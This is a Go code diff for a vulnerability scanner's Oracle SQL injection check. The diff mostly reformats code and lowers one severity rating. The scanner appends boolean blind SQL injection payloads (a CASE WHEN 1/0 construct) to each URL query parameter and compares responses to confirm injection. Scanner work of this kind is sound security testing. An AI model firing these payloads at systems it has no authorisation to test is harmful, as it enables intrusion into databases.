@@ -52,10 +52,10 @@ func ScanOracleLengthFilter(baseURL string, client *http.Client, onFound func(co
 	// 3. Shortest Boolean Payloads (from the article)
 	// We need to inject this into existing parameters.
 	// Payload: 'AND(CASE WHEN(1=1)THEN 1ELSE 1/0END)=1OR'1'='1
-	
+
 	// We iterate over params. For simplicity, we append to the URL (assuming one param or appending to query string works).
 	// Ideally, we should parse query params. For now, we append `&id=` or inject into `?id=` if exists.
-	
+
 	payloadTrue := "'AND(CASE WHEN(1=1)THEN 1ELSE 1/0END)=1OR'1'='1"
 	payloadFalse := "'AND(CASE WHEN(1=2)THEN 1ELSE 1/0END)=1OR'1'='1"
 
@@ -63,34 +63,38 @@ func ScanOracleLengthFilter(baseURL string, client *http.Client, onFound func(co
 	// Simple approach: Replace query params
 	u, _ := url.Parse(baseURL)
 	q := u.Query()
-	
+
 	for param := range q {
 		originalVal := q.Get(param)
-		
+
 		// Test True
 		q.Set(param, originalVal+payloadTrue)
 		u.RawQuery = q.Encode()
 		targetTrue := u.String()
 
 		respT, errT := client.Get(targetTrue)
-		if errT != nil { continue }
+		if errT != nil {
+			continue
+		}
 		bodyT, _ := io.ReadAll(respT.Body)
 		respT.Body.Close()
-		
+
 		// Test False
-		q.Set(param, originalVal + payloadFalse)
+		q.Set(param, originalVal+payloadFalse)
 		u.RawQuery = q.Encode()
 		targetFalse := u.String()
-		
+
 		respF, errF := client.Get(targetFalse)
-		if errF != nil { continue }
+		if errF != nil {
+			continue
+		}
 		bodyF, _ := io.ReadAll(respF.Body)
 		respF.Body.Close()
 
 		// 4. Verification Logic
 		// Logic: True Payload should be similar to Baseline (200 OK)
 		//        False Payload should be Different (500 Error, or 1/0 error -> "Divide by zero")
-		
+
 		isConfirmed := false
 		evidence := ""
 		severity := "High" // Default for Boolean Blind without extraction
@@ -105,20 +109,21 @@ func ScanOracleLengthFilter(baseURL string, client *http.Client, onFound func(co
 		// 1/0 in Oracle raises "ORA-01476: divisor is equal to zero"
 		if strings.Contains(string(bodyF), "ORA-01476") || strings.Contains(string(bodyF), "divisor is equal to zero") {
 			isConfirmed = true
-			severity = "Critical" // Explicit error allows easier extraction
+			// Error-based oracle confirmation is strong but still below direct data extraction.
+			severity = "High"
 			evidence = "Oracle Error (Divisor is equal to zero) triggered by False payload."
 		}
 
 		// Check 3: Length/Content deviation
 		lenT := len(bodyT)
 		lenF := len(bodyF)
-		
+
 		if !isConfirmed {
 			// TRIPLE CHECK for Length Deviation
 			// 1. True must be VERY similar to Baseline (< 2% diff)
 			// 2. False must be SIGNIFICANTLY different from Baseline (> 5% diff)
 			// 3. Repeat to ensure stability
-			
+
 			if isSimilarLengthStrict(lenT, baseLen) && !isSimilarLengthStrict(lenF, baseLen) {
 				// Verify Stability
 				vRespT, _ := client.Get(targetTrue)
@@ -126,7 +131,7 @@ func ScanOracleLengthFilter(baseURL string, client *http.Client, onFound func(co
 				if vRespT != nil && vRespF != nil {
 					vLenT := getRespLen(vRespT)
 					vLenF := getRespLen(vRespF)
-					
+
 					if isSimilarLengthStrict(vLenT, baseLen) && !isSimilarLengthStrict(vLenF, baseLen) {
 						isConfirmed = true
 						evidence = fmt.Sprintf("Stable Response Length Deviation (Triple Checked):\n- Baseline: %d bytes\n- True Payload: %d bytes\n- False Payload: %d bytes", baseLen, vLenT, vLenF)
@@ -142,7 +147,7 @@ Payload A (TRUE): %s -> HTTP %d (Len: %d)
 Payload B (FALSE): %s -> HTTP %d (Len: %d)
 Baseline: %s -> HTTP %d (Len: %d)
 Conclusion: Boolean-based SQL Injection confirmed (Oracle Length Filter Bypass).
-Reason: %s`, 
+Reason: %s`,
 				payloadTrue, respT.StatusCode, lenT,
 				payloadFalse, respF.StatusCode, lenF,
 				"Original Request", baseCode, baseLen,
@@ -161,11 +166,15 @@ func getRespLen(r *http.Response) int {
 }
 
 func isSimilarLengthStrict(a, b int) bool {
-	if a == 0 || b == 0 { return false }
+	if a == 0 || b == 0 {
+		return false
+	}
 	diff := a - b
-	if diff < 0 { diff = -diff }
+	if diff < 0 {
+		diff = -diff
+	}
 	// Strict 2% tolerance for large pages
-	return diff < (b / 50) 
+	return diff < (b / 50)
 }
 
 func reportOracle(target, evidence, severity string, onFound func(core.Finding)) {
